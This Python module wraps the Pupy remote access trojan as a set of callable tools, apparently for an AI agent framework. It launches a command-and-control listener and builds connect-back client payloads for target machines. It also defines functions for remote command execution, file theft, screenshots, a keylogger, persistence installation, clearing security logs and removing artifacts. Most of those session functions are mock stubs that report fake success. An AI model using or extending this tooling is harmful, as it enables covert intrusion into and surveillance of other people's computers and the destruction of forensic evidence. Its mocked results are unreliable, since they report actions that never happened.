#!/usr/bin/env python3

import os
import subprocess
import json
import base64
import tempfile
import socket
from typing import Dict, Any, List, Optional
import logging
import time
import threading

logger = logging.getLogger("pupy_tools")

# Set tool namespace
TOOL_NAMESPACE = "pupy"

class PupyManager:
    """Pupy RAT management and operations"""
    
    def __init__(self):
        self.pupy_path = None
        self.server_running = False
        self.server_port = 9999
        self.active_sessions = {}
        self.server_process = None
        
    def _find_pupy_installation(self) -> bool:
        """Find Pupy installation"""
        possible_paths = [
            "/opt/pupy",
            "/usr/local/pupy",
            "./pupy",
            os.path.expanduser("~/pupy"),
            os.path.expanduser("~/tools/pupy")
        ]
        
        for path in possible_paths:
            pupy_client_path = os.path.join(path, "pupy", "pupylib")
            if os.path.exists(pupy_client_path):
                self.pupy_path = path
                logger.info(f"Found Pupy installation at: {path}")
                return True
        
        logger.warning("Pupy installation not found")
        return False
    
    def _execute_pupy_command(self, command: str, timeout: int = 30) -> Dict[str, Any]:
        """Execute Pupy command"""
        try:
            if not self.pupy_path:
                return {"error": "Pupy not installed or not found"}
            
            # Change to pupy directory
            old_cwd = os.getcwd()
            os.chdir(self.pupy_path)
            
            try:
                result = subprocess.run(
                    command.split(),
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    cwd=self.pupy_path
                )
                
                return {
                    "success": result.returncode == 0,
                    "output": result.stdout.strip(),
                    "error": result.stderr.strip() if result.stderr else None,
                    "exit_code": result.returncode
                }
            finally:
                os.chdir(old_cwd)
                
        except subprocess.TimeoutExpired:
            return {"error": f"Command timed out after {timeout} seconds"}
        except Exception as e:
            return {"error": str(e)}

pupy_manager = PupyManager()

# Installation and Setup Tools
def pupy_check_installation(**kwargs) -> Dict[str, Any]:
    """Check if Pupy is installed and available"""
    found = pupy_manager._find_pupy_installation()
    
    check_result = {
        "pupy_installed": found,
        "pupy_path": pupy_manager.pupy_path,
        "python_version": None,
        "dependencies": {},
        "status": "not_found"
    }
    
    if found:
        # Check Python version
        try:
            python_check = subprocess.run(
                ["python3", "--version"], capture_output=True, text=True
            )
            check_result["python_version"] = python_check.stdout.strip()
        except:
            pass
        
        # Check key dependencies
        deps_to_check = ["rpyc", "psutil", "pyopenssl", "pycryptodome"]
        for dep in deps_to_check:
            try:
                import_check = subprocess.run(
                    ["python3", "-c", f"import {dep}; print('OK')"],
                    capture_output=True, text=True
                )
                check_result["dependencies"][dep] = import_check.returncode == 0
            except:
                check_result["dependencies"][dep] = False
        
        all_deps_ok = all(check_result["dependencies"].values())
        check_result["status"] = "ready" if all_deps_ok else "missing_dependencies"
    
    return check_result

def pupy_install_dependencies(**kwargs) -> Dict[str, Any]:
    """Install required Python dependencies for Pupy"""
    dependencies = [
        "rpyc>=5.0.0",
        "psutil",
        "pyopenssl", 
        "pycryptodome",
        "pynacl",
        "netaddr",
        "tinyec"
    ]
    
    results = {
        "installed": [],
        "failed": [],
        "already_satisfied": []
    }
    
    for dep in dependencies:
        try:
            result = subprocess.run(
                ["pip3", "install", dep],
                capture_output=True, text=True, timeout=60
            )
            
            if result.returncode == 0:
                if "already satisfied" in result.stdout.lower():
                    results["already_satisfied"].append(dep)
                else:
                    results["installed"].append(dep)
            else:
                results["failed"].append({"dep": dep, "error": result.stderr})
                
        except Exception as e:
            results["failed"].append({"dep": dep, "error": str(e)})
    
    return results

# Server Management Tools
def pupy_start_server(port: int = 9999, interface: str = "0.0.0.0", **kwargs) -> Dict[str, Any]:
    """Start Pupy server"""
    if not pupy_manager._find_pupy_installation():
        return {"error": "Pupy installation not found"}
    
    if pupy_manager.server_running:
        return {"error": f"Server already running on port {pupy_manager.server_port}"}
    
    try:
        # Start Pupy server in background
        pupy_server_cmd = [
            "python3", "pupy/pupysh.py",
            "--port", str(port),
            "--host", interface,
            "--transport", "ssl_rsa_aes"
        ]
        
        pupy_manager.server_process = subprocess.Popen(
            pupy_server_cmd,
            cwd=pupy_manager.pupy_path,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Give server time to start
        time.sleep(3)
        
        # Check if server is running
        if pupy_manager.server_process.poll() is None:
            pupy_manager.server_running = True
            pupy_manager.server_port = port
            
            return {
                "success": True,
                "server_port": port,
                "server_interface": interface,
                "process_id": pupy_manager.server_process.pid,
                "status": "running"
            }
        else:
            error_output = pupy_manager.server_process.stderr.read()
            return {"error": f"Server failed to start: {error_output}"}
            
    except Exception as e:
        return {"error": f"Failed to start server: {str(e)}"}

def pupy_stop_server(**kwargs) -> Dict[str, Any]:
    """Stop Pupy server"""
    if not pupy_manager.server_running or not pupy_manager.server_process:
        return {"error": "No server running"}
    
    try:
        pupy_manager.server_process.terminate()
        pupy_manager.server_process.wait(timeout=10)
        
        pupy_manager.server_running = False
        pupy_manager.server_process = None
        pupy_manager.active_sessions.clear()
        
        return {
            "success": True,
            "message": "Pupy server stopped"
        }
        
    except Exception as e:
        return {"error": f"Failed to stop server: {str(e)}"}

def pupy_server_status(**kwargs) -> Dict[str, Any]:
    """Get Pupy server status"""
    return {
        "server_running": pupy_manager.server_running,
        "server_port": pupy_manager.server_port if pupy_manager.server_running else None,
        "active_sessions": len(pupy_manager.active_sessions),
        "process_id": pupy_manager.server_process.pid if pupy_manager.server_process else None
    }

# Client Generation Tools
def pupy_generate_payload(platform: str = "windows",
                         format: str = "exe", 
                         connect_back_ip: str = "127.0.0.1",
                         connect_back_port: int = 9999,
                         transport: str = "ssl",
                         output_dir: str = "./payloads", **kwargs) -> Dict[str, Any]:
    """Generate Pupy client payload"""
    
    if not pupy_manager._find_pupy_installation():
        return {"error": "Pupy installation not found"}
    
    # Ensure output directory exists
    os.makedirs(output_dir, exist_ok=True)
    
    # Generate payload filename
    payload_name = f"pupy_{platform}_{int(time.time())}.{format}"
    payload_path = os.path.join(output_dir, payload_name)
    
    try:
        # Build pupy-gen command
        gen_cmd = [
            "python3", "pupy/pupygen.py",
            "-p", platform,
            "-f", format,
            "-o", payload_path,
            "--host", connect_back_ip,
            "--port", str(connect_back_port),
            "--transport", transport
        ]
        
        old_cwd = os.getcwd()
        os.chdir(pupy_manager.pupy_path)
        
        try:
            result = subprocess.run(
                gen_cmd, capture_output=True, text=True, timeout=120
            )
            
            if result.returncode == 0 and os.path.exists(payload_path):
                file_size = os.path.getsize(payload_path)
                
                return {
                    "success": True,
                    "payload_path": payload_path,
                    "payload_name": payload_name,
                    "platform": platform,
                    "format": format,
                    "file_size": file_size,
                    "connect_back": f"{connect_back_ip}:{connect_back_port}",
                    "transport": transport
                }
            else:
                return {
                    "error": f"Payload generation failed: {result.stderr}",
                    "command_output": result.stdout
                }
                
        finally:
            os.chdir(old_cwd)
            
    except Exception as e:
        return {"error": f"Failed to generate payload: {str(e)}"}

def pupy_list_sessions(**kwargs) -> Dict[str, Any]:
    """List active Pupy sessions"""
    # This would typically interface with Pupy's session management
    # For now, return mock data structure
    return {
        "active_sessions": list(pupy_manager.active_sessions.keys()),
        "session_count": len(pupy_manager.active_sessions),
        "sessions": pupy_manager.active_sessions
    }

# Session Management Tools  
def pupy_execute_command(session_id: str, command: str, **kwargs) -> Dict[str, Any]:
    """Execute command on Pupy session"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    # This would interface with Pupy's command execution
    # Mock implementation for now
    return {
        "session_id": session_id,
        "command": command,
        "output": f"Mock output for command: {command}",
        "success": True,
        "execution_time": time.time()
    }

def pupy_download_file(session_id: str, remote_path: str, 
                      local_path: str = None, **kwargs) -> Dict[str, Any]:
    """Download file from target via Pupy session"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    if not local_path:
        local_path = f"./downloads/{os.path.basename(remote_path)}"
    
    # Mock implementation
    return {
        "session_id": session_id,
        "remote_path": remote_path,
        "local_path": local_path,
        "success": True,
        "file_size": 0,  # Would be actual size
        "download_time": time.time()
    }

def pupy_upload_file(session_id: str, local_path: str, 
                    remote_path: str = None, **kwargs) -> Dict[str, Any]:
    """Upload file to target via Pupy session"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    if not os.path.exists(local_path):
        return {"error": f"Local file not found: {local_path}"}
    
    if not remote_path:
        remote_path = f"/tmp/{os.path.basename(local_path)}"
    
    # Mock implementation
    return {
        "session_id": session_id,
        "local_path": local_path,
        "remote_path": remote_path,
        "success": True,
        "file_size": os.path.getsize(local_path),
        "upload_time": time.time()
    }

# Information Gathering Tools
def pupy_get_system_info(session_id: str, **kwargs) -> Dict[str, Any]:
    """Get system information from Pupy session"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    # Mock system info - would be actual data from target
    return {
        "session_id": session_id,
        "system_info": {
            "hostname": "target-machine",
            "os": "Windows 10",
            "architecture": "x64",
            "user": "admin",
            "domain": "WORKGROUP",
            "ip_address": "192.168.1.100",
            "mac_address": "00:11:22:33:44:55"
        },
        "collected_at": time.time()
    }

def pupy_enumerate_processes(session_id: str, **kwargs) -> Dict[str, Any]:
    """Enumerate running processes on target"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    # Mock process list
    return {
        "session_id": session_id,
        "processes": [
            {"pid": 1234, "name": "explorer.exe", "user": "admin"},
            {"pid": 5678, "name": "chrome.exe", "user": "admin"},
            {"pid": 9012, "name": "notepad.exe", "user": "admin"}
        ],
        "process_count": 3,
        "collected_at": time.time()
    }

# Advanced Operations
def pupy_screen_capture(session_id: str, save_path: str = None, **kwargs) -> Dict[str, Any]:
    """Capture screenshot from target"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    if not save_path:
        save_path = f"./screenshots/screen_{session_id}_{int(time.time())}.png"
    
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    
    return {
        "session_id": session_id,
        "screenshot_path": save_path,
        "success": True,
        "capture_time": time.time()
    }

def pupy_keylogger_start(session_id: str, duration: int = 300, **kwargs) -> Dict[str, Any]:
    """Start keylogger on target"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    return {
        "session_id": session_id,
        "keylogger_started": True,
        "duration_seconds": duration,
        "log_file": f"keylog_{session_id}_{int(time.time())}.txt",
        "started_at": time.time()
    }

def pupy_persistence_install(session_id: str, method: str = "registry", **kwargs) -> Dict[str, Any]:
    """Install persistence mechanism"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    persistence_methods = ["registry", "service", "startup_folder", "scheduled_task"]
    
    if method not in persistence_methods:
        return {"error": f"Invalid method. Use: {', '.join(persistence_methods)}"}
    
    return {
        "session_id": session_id,
        "persistence_method": method,
        "installed": True,
        "persistence_location": f"Mock location for {method}",
        "installed_at": time.time()
    }

# Cleanup and Forensics
def pupy_clear_logs(session_id: str, log_types: List[str] = None, **kwargs) -> Dict[str, Any]:
    """Clear logs on target system"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    if not log_types:
        log_types = ["security", "system", "application"]
    
    return {
        "session_id": session_id,
        "cleared_logs": log_types,
        "success": True,
        "cleared_at": time.time()
    }

def pupy_remove_artifacts(session_id: str, **kwargs) -> Dict[str, Any]:
    """Remove Pupy artifacts from target"""
    if session_id not in pupy_manager.active_sessions:
        return {"error": f"Session {session_id} not found"}
    
    return {
        "session_id": session_id,
        "artifacts_removed": [
            "Pupy client binary",
            "Temporary files", 
            "Registry entries",
            "Event log entries"
        ],
        "cleanup_complete": True,
        "cleaned_at": time.time()
    }

# Tool Registry
TOOL_REGISTRY = {
    "check_installation": pupy_check_installation,
    "install_dependencies": pupy_install_dependencies,
    "start_server": pupy_start_server,
    "stop_server": pupy_stop_server,
    "server_status": pupy_server_status,
    "generate_payload": pupy_generate_payload,
    "list_sessions": pupy_list_sessions,
    "execute_command": pupy_execute_command,
    "download_file": pupy_download_file,
    "upload_file": pupy_upload_file,
    "get_system_info": pupy_get_system_info,
    "enumerate_processes": pupy_enumerate_processes,
    "screen_capture": pupy_screen_capture,
    "keylogger_start": pupy_keylogger_start,
    "persistence_install": pupy_persistence_install,
    "clear_logs": pupy_clear_logs,
    "remove_artifacts": pupy_remove_artifacts
}

print("✅ Pupy RAT tools loaded successfully")